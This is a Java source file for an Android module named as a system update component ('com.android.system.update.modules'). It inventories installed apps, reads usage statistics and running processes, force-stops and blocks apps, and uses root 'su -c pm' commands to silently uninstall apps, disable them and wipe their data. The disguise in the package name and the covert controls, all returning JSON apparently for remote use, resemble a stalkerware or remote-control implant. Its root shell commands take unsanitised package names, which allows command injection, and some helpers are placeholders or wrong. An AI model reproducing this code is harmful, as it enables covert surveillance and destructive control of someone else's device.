package com.android.system.update.modules;

import android.app.ActivityManager;
import android.app.AppOpsManager;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.os.UserManager;
import android.util.Base64;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.TimeUnit;

public class AppManagerModule {
    private static final String TAG = "AppManagerModule";
    private Context context;
    private PackageManager packageManager;
    private ActivityManager activityManager;
    private AppOpsManager appOpsManager;
    private UsageStatsManager usageStatsManager;
    
    // Set of blocked packages (would be stored in SharedPreferences in production)
    private Set<String> blockedPackages = new HashSet<>();
    
    public AppManagerModule(Context context) {
        this.context = context;
        this.packageManager = context.getPackageManager();
        this.activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        this.appOpsManager = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            this.usageStatsManager = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
        }
        
        // Load blocked packages (in production, load from SharedPreferences)
        loadBlockedPackages();
    }
    
    private void loadBlockedPackages() {
        // In production, load from SharedPreferences
        // For now, add some defaults for testing
        blockedPackages.add("com.android.chrome");
        blockedPackages.add("com.facebook.katana");
    }
    
    /**
     * List all installed apps with details
     * @param includeSystemApps Whether to include system apps in the list
     * @return JSON string with apps list
     */
    public String listInstalledApps(boolean includeSystemApps) {
        try {
            JSONArray appsArray = new JSONArray();
            
            List<ApplicationInfo> apps = packageManager.getInstalledApplications(
                PackageManager.GET_META_DATA);
            
            for (ApplicationInfo appInfo : apps) {
                // Skip system apps if not included
                if (!includeSystemApps && (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) {
                    continue;
                }
                
                JSONObject appJson = new JSONObject();
                appJson.put("packageName", appInfo.packageName);
                appJson.put("name", packageManager.getApplicationLabel(appInfo));
                appJson.put("version", getAppVersion(appInfo.packageName));
                appJson.put("isSystem", (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
                appJson.put("isUpdatedSystemApp", (appInfo.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0);
                appJson.put("isEnabled", packageManager.getApplicationEnabledSetting(appInfo.packageName) == PackageManager.COMPONENT_ENABLED_STATE_ENABLED);
                appJson.put("installTime", appInfo.firstInstallTime);
                appJson.put("updateTime", appInfo.lastUpdateTime);
                appJson.put("uid", appInfo.uid);
                appJson.put("targetSdk", appInfo.targetSdkVersion);
                appJson.put("minSdk", appInfo.minSdkVersion);
                
                // Get app size if possible
                appJson.put("size", getAppSize(appInfo.packageName));
                
                // Get icon as base64 (optional - can be large)
                // appJson.put("icon", getAppIconBase64(appInfo.packageName));
                
                // Check if app is running
                appJson.put("isRunning", isAppRunning(appInfo.packageName));
                
                // Check if blocked
                appJson.put("isBlocked", blockedPackages.contains(appInfo.packageName));
                
                appsArray.put(appJson);
            }
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("count", appsArray.length());
            result.put("apps", appsArray);
            result.put("timestamp", System.currentTimeMillis());
            
            return result.toString();
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating apps JSON", e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    /**
     * Get detailed info for a specific app
     * @param packageName The package name of the app
     * @return JSON string with app details
     */
    public String getAppInfo(String packageName) {
        try {
            ApplicationInfo appInfo = packageManager.getApplicationInfo(packageName, 
                PackageManager.GET_META_DATA);
            
            JSONObject appJson = new JSONObject();
            appJson.put("packageName", appInfo.packageName);
            appJson.put("name", packageManager.getApplicationLabel(appInfo));
            appJson.put("version", getAppVersion(appInfo.packageName));
            appJson.put("isSystem", (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
            appJson.put("isUpdatedSystemApp", (appInfo.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0);
            appJson.put("isEnabled", packageManager.getApplicationEnabledSetting(appInfo.packageName) == PackageManager.COMPONENT_ENABLED_STATE_ENABLED);
            appJson.put("installTime", appInfo.firstInstallTime);
            appJson.put("updateTime", appInfo.lastUpdateTime);
            appJson.put("uid", appInfo.uid);
            appJson.put("targetSdk", appInfo.targetSdkVersion);
            appJson.put("dataDir", appInfo.dataDir);
            appJson.put("sourceDir", appInfo.sourceDir);
            appJson.put("nativeLibraryDir", appInfo.nativeLibraryDir);
            
            // Get permissions
            JSONArray permissionsArray = new JSONArray();
            try {
                PackageInfo packageInfo = packageManager.getPackageInfo(packageName, 
                    PackageManager.GET_PERMISSIONS);
                if (packageInfo.requestedPermissions != null) {
                    for (String perm : packageInfo.requestedPermissions) {
                        JSONObject permJson = new JSONObject();
                        permJson.put("name", perm);
                        permJson.put("granted", (packageInfo.requestedPermissionsFlags != null && 
                            packageInfo.requestedPermissionsFlags.length > 0));
                        permissionsArray.put(permJson);
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error getting permissions", e);
            }
            appJson.put("permissions", permissionsArray);
            
            // Get activities
            JSONArray activitiesArray = new JSONArray();
            try {
                PackageInfo packageInfo = packageManager.getPackageInfo(packageName, 
                    PackageManager.GET_ACTIVITIES);
                if (packageInfo.activities != null) {
                    for (android.content.pm.ActivityInfo activity : packageInfo.activities) {
                        activitiesArray.put(activity.name);
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error getting activities", e);
            }
            appJson.put("activities", activitiesArray);
            
            // Get services
            JSONArray servicesArray = new JSONArray();
            try {
                PackageInfo packageInfo = packageManager.getPackageInfo(packageName, 
                    PackageManager.GET_SERVICES);
                if (packageInfo.services != null) {
                    for (android.content.pm.ServiceInfo service : packageInfo.services) {
                        servicesArray.put(service.name);
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error getting services", e);
            }
            appJson.put("services", servicesArray);
            
            // Get receivers
            JSONArray receiversArray = new JSONArray();
            try {
                PackageInfo packageInfo = packageManager.getPackageInfo(packageName, 
                    PackageManager.GET_RECEIVERS);
                if (packageInfo.receivers != null) {
                    for (android.content.pm.ActivityInfo receiver : packageInfo.receivers) {
                        receiversArray.put(receiver.name);
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error getting receivers", e);
            }
            appJson.put("receivers", receiversArray);
            
            // Get size
            appJson.put("size", getAppSize(packageName));
            
            // Check if running
            appJson.put("isRunning", isAppRunning(packageName));
            
            // Check if blocked
            appJson.put("isBlocked", blockedPackages.contains(packageName));
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("app", appJson);
            
            return result.toString();
            
        } catch (PackageManager.NameNotFoundException e) {
            Log.e(TAG, "App not found: " + packageName, e);
            return "{\"success\":false,\"error\":\"App not found: " + packageName + "\"}";
        } catch (JSONException e) {
            Log.e(TAG, "Error creating app JSON", e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    /**
     * Force stop an app
     * @param packageName The package name of the app to stop
     * @return JSON string with result
     */
    public String forceStopApp(String packageName) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                activityManager.forceStopPackage(packageName);
            } else {
                // For older Android versions
                activityManager.killBackgroundProcesses(packageName);
            }
            
            Log.i(TAG, "Force stopped app: " + packageName);
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("message", "App force stopped successfully");
            result.put("packageName", packageName);
            result.put("timestamp", System.currentTimeMillis());
            
            return result.toString();
            
        } catch (SecurityException e) {
            Log.e(TAG, "Permission denied to stop app: " + packageName, e);
            return "{\"success\":false,\"error\":\"Permission denied. Need KILL_BACKGROUND_PROCESSES permission.\"}";
        } catch (Exception e) {
            Log.e(TAG, "Error stopping app: " + packageName, e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    /**
     * Uninstall an app (will prompt user or use silent uninstall if possible)
     * @param packageName The package name of the app to uninstall
     * @param silent Whether to attempt silent uninstall (requires root/privileges)
     * @return JSON string with result
     */
    public String uninstallApp(String packageName, boolean silent) {
        try {
            if (silent) {
                // Attempt silent uninstall (requires root or system privileges)
                boolean success = silentUninstall(packageName);
                
                JSONObject result = new JSONObject();
                result.put("success", success);
                result.put("silent", true);
                if (success) {
                    result.put("message", "App silently uninstalled successfully");
                } else {
                    result.put("error", "Silent uninstall failed. May require root.");
                }
                return result.toString();
                
            } else {
                // Launch normal uninstall intent
                Intent intent = new Intent(Intent.ACTION_DELETE);
                intent.setData(android.net.Uri.parse("package:" + packageName));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                
                JSONObject result = new JSONObject();
                result.put("success", true);
                result.put("message", "Uninstall intent launched");
                result.put("packageName", packageName);
                return result.toString();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error uninstalling app: " + packageName, e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    /**
     * Attempt silent uninstall (requires root)
     */
    private boolean silentUninstall(String packageName) {
        try {
            // Try using pm command (requires root)
            Process process = Runtime.getRuntime().exec("su -c pm uninstall " + packageName);
            int exitCode = process.waitFor();
            return exitCode == 0;
        } catch (Exception e) {
            Log.e(TAG, "Silent uninstall failed", e);
            return false;
        }
    }
    
    /**
     * Get app usage statistics
     * @param days Number of days to look back
     * @return JSON string with usage stats
     */
    public String getAppUsageStats(int days) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return "{\"success\":false,\"error\":\"Usage stats require Android 5.0+\"}";
        }
        
        try {
            long endTime = System.currentTimeMillis();
            long startTime = endTime - TimeUnit.DAYS.toMillis(days);
            
            List<UsageStats> usageStatsList = usageStatsManager.queryUsageStats(
                UsageStatsManager.INTERVAL_DAILY, startTime, endTime);
            
            JSONArray statsArray = new JSONArray();
            
            if (usageStatsList != null) {
                // Sort by total time in foreground
                Collections.sort(usageStatsList, new Comparator<UsageStats>() {
                    @Override
                    public int compare(UsageStats o1, UsageStats o2) {
                        return Long.compare(o2.getTotalTimeInForeground(), 
                            o1.getTotalTimeInForeground());
                    }
                });
                
                for (UsageStats stats : usageStatsList) {
                    if (stats.getTotalTimeInForeground() > 0) {
                        JSONObject statJson = new JSONObject();
                        statJson.put("packageName", stats.getPackageName());
                        
                        try {
                            ApplicationInfo appInfo = packageManager.getApplicationInfo(
                                stats.getPackageName(), 0);
                            statJson.put("appName", packageManager.getApplicationLabel(appInfo));
                        } catch (Exception e) {
                            statJson.put("appName", stats.getPackageName());
                        }
                        
                        statJson.put("totalTimeInForeground", stats.getTotalTimeInForeground());
                        statJson.put("totalTimeInForegroundFormatted", 
                            formatTime(stats.getTotalTimeInForeground()));
                        statJson.put("lastTimeUsed", stats.getLastTimeUsed());
                        statJson.put("lastTimeUsedFormatted", 
                            formatTimestamp(stats.getLastTimeUsed()));
                        statJson.put("firstTimeUsed", stats.getFirstTimeUsed());
                        
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            statJson.put("lastTimeForegroundServiceUsed", 
                                stats.getLastTimeForegroundServiceUsed());
                        }
                        
                        statsArray.put(statJson);
                    }
                }
            }
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("days", days);
            result.put("startTime", startTime);
            result.put("endTime", endTime);
            result.put("count", statsArray.length());
            result.put("stats", statsArray);
            
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting usage stats", e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    /**
     * Block or unblock an app
     * @param packageName The package name to block/unblock
     * @param block True to block, false to unblock
     * @return JSON string with result
     */
    public String blockApp(String packageName, boolean block) {
        try {
            if (block) {
                blockedPackages.add(packageName);
                
                // Force stop the app immediately
                forceStopApp(packageName);
                
                // Disable the app if possible (requires root or system privileges)
                // setAppEnabled(packageName, false);
                
                Log.i(TAG, "Blocked app: " + packageName);
            } else {
                blockedPackages.remove(packageName);
                Log.i(TAG, "Unblocked app: " + packageName);
            }
            
            // Save blocked list (in production, save to SharedPreferences)
            saveBlockedPackages();
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("packageName", packageName);
            result.put("blocked", block);
            result.put("message", block ? "App blocked successfully" : "App unblocked successfully");
            
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Error blocking app: " + packageName, e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    /**
     * Enable or disable an app (requires root or system privileges)
     */
    private boolean setAppEnabled(String packageName, boolean enable) {
        try {
            String command = enable ? "enable" : "disable";
            Process process = Runtime.getRuntime().exec("su -c pm " + command + " " + packageName);
            int exitCode = process.waitFor();
            return exitCode == 0;
        } catch (Exception e) {
            Log.e(TAG, "Failed to set app enabled state", e);
            return false;
        }
    }
    
    /**
     * Get list of currently running apps
     * @return JSON string with running apps
     */
    public String getRunningApps() {
        try {
            List<ActivityManager.RunningAppProcessInfo> runningProcesses = 
                activityManager.getRunningAppProcesses();
            
            JSONArray runningArray = new JSONArray();
            Set<String> addedPackages = new HashSet<>();
            
            if (runningProcesses != null) {
                for (ActivityManager.RunningAppProcessInfo process : runningProcesses) {
                    for (String pkg : process.pkgList) {
                        if (!addedPackages.contains(pkg)) {
                            addedPackages.add(pkg);
                            
                            JSONObject appJson = new JSONObject();
                            appJson.put("packageName", pkg);
                            
                            try {
                                ApplicationInfo appInfo = packageManager.getApplicationInfo(pkg, 0);
                                appJson.put("appName", packageManager.getApplicationLabel(appInfo));
                            } catch (Exception e) {
                                appJson.put("appName", pkg);
                            }
                            
                            appJson.put("pid", process.pid);
                            appJson.put("processName", process.processName);
                            appJson.put("importance", process.importance);
                            appJson.put("importanceReasonCode", process.importanceReasonCode);
                            appJson.put("isBlocked", blockedPackages.contains(pkg));
                            
                            runningArray.put(appJson);
                        }
                    }
                }
            }
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("count", runningArray.length());
            result.put("apps", runningArray);
            
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting running apps", e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    /**
     * Clear app data (requires root or system privileges)
     * @param packageName The package name
     * @return JSON string with result
     */
    public String clearAppData(String packageName) {
        try {
            // Try using pm command (requires root)
            Process process = Runtime.getRuntime().exec("su -c pm clear " + packageName);
            int exitCode = process.waitFor();
            
            boolean success = exitCode == 0;
            
            JSONObject result = new JSONObject();
            result.put("success", success);
            if (success) {
                result.put("message", "App data cleared successfully");
            } else {
                result.put("error", "Failed to clear app data. May require root.");
            }
            result.put("packageName", packageName);
            
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Error clearing app data: " + packageName, e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    /**
     * Get app categories (game, social, etc.)
     * @return JSON string with app categories
     */
    public String getAppCategories() {
        try {
            JSONObject categories = new JSONObject();
            JSONArray games = new JSONArray();
            JSONArray social = new JSONArray();
            JSONArray messaging = new JSONArray();
            JSONArray productivity = new JSONArray();
            JSONArray system = new JSONArray();
            JSONArray other = new JSONArray();
            
            List<ApplicationInfo> apps = packageManager.getInstalledApplications(0);
            
            for (ApplicationInfo appInfo : apps) {
                String packageName = appInfo.packageName;
                String appName = packageManager.getApplicationLabel(appInfo).toString();
                
                JSONObject appJson = new JSONObject();
                appJson.put("packageName", packageName);
                appJson.put("name", appName);
                appJson.put("isBlocked", blockedPackages.contains(packageName));
                
                // Categorize based on package name patterns (simplified)
                if (packageName.contains("game") || packageName.contains("unity") ||
                    packageName.contains("com.tencent") || appName.toLowerCase().contains("game")) {
                    games.put(appJson);
                } else if (packageName.contains("facebook") || packageName.contains("instagram") ||
                           packageName.contains("twitter") || packageName.contains("snapchat")) {
                    social.put(appJson);
                } else if (packageName.contains("whatsapp") || packageName.contains("telegram") ||
                           packageName.contains("signal") || packageName.contains("messenger")) {
                    messaging.put(appJson);
                } else if (packageName.contains("doc") || packageName.contains("office") ||
                           packageName.contains("excel") || packageName.contains("word")) {
                    productivity.put(appJson);
                } else if ((appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) {
                    system.put(appJson);
                } else {
                    other.put(appJson);
                }
            }
            
            categories.put("games", games);
            categories.put("social", social);
            categories.put("messaging", messaging);
            categories.put("productivity", productivity);
            categories.put("system", system);
            categories.put("other", other);
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("categories", categories);
            
            return result.toString();
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating categories", e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    // Helper methods
    
    private String getAppVersion(String packageName) {
        try {
            PackageInfo pkgInfo = packageManager.getPackageInfo(packageName, 0);
            return pkgInfo.versionName;
        } catch (Exception e) {
            return "Unknown";
        }
    }
    
    private long getAppSize(String packageName) {
        // This is a placeholder - getting actual app size requires more complex code
        // and storage access permissions
        return 0;
    }
    
    private boolean isAppRunning(String packageName) {
        List<ActivityManager.RunningAppProcessInfo> runningProcesses = 
            activityManager.getRunningAppProcesses();
        if (runningProcesses != null) {
            for (ActivityManager.RunningAppProcessInfo process : runningProcesses) {
                for (String pkg : process.pkgList) {
                    if (pkg.equals(packageName)) {
                        return true;
                    }
                }
            }
        }
        return false;
    }
    
    private String getAppIconBase64(String packageName) {
        try {
            Drawable icon = packageManager.getApplicationIcon(packageName);
            if (icon instanceof BitmapDrawable) {
                Bitmap bitmap = ((BitmapDrawable) icon).getBitmap();
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
                byte[] bytes = baos.toByteArray();
                return Base64.encodeToString(bytes, Base64.DEFAULT);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting app icon", e);
        }
        return "";
    }
    
    private String formatTime(long millis) {
        long hours = TimeUnit.MILLISECONDS.toHours(millis);
        long minutes = TimeUnit.MILLISECONDS.toMinutes(millis) % 60;
        long seconds = TimeUnit.MILLISECONDS.toSeconds(millis) % 60;
        
        if (hours > 0) {
            return String.format("%dh %dm", hours, minutes);
        } else if (minutes > 0) {
            return String.format("%dm %ds", minutes, seconds);
        } else {
            return String.format("%ds", seconds);
        }
    }
    
    private String formatTimestamp(long timestamp) {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        return sdf.format(new Date(timestamp));
    }
    
    private void saveBlockedPackages() {
        // In production, save to SharedPreferences
        // For now, just log
        Log.d(TAG, "Blocked packages: " + blockedPackages);
    }
    
    /**
     * Get list of blocked apps
     * @return JSON string with blocked apps
     */
    public String getBlockedApps() {
        try {
            JSONArray blockedArray = new JSONArray();
            
            for (String packageName : blockedPackages) {
                JSONObject appJson = new JSONObject();
                appJson.put("packageName", packageName);
                
                try {
                    ApplicationInfo appInfo = packageManager.getApplicationInfo(packageName, 0);
                    appJson.put("appName", packageManager.getApplicationLabel(appInfo));
                } catch (Exception e) {
                    appJson.put("appName", packageName);
                }
                
                appJson.put("isRunning", isAppRunning(packageName));
                
                blockedArray.put(appJson);
            }
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("count", blockedArray.length());
            result.put("apps", blockedArray);
            
            return result.toString();
            
        } catch (JSONException e) {
            Log.e(TAG, "Error getting blocked apps", e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
}
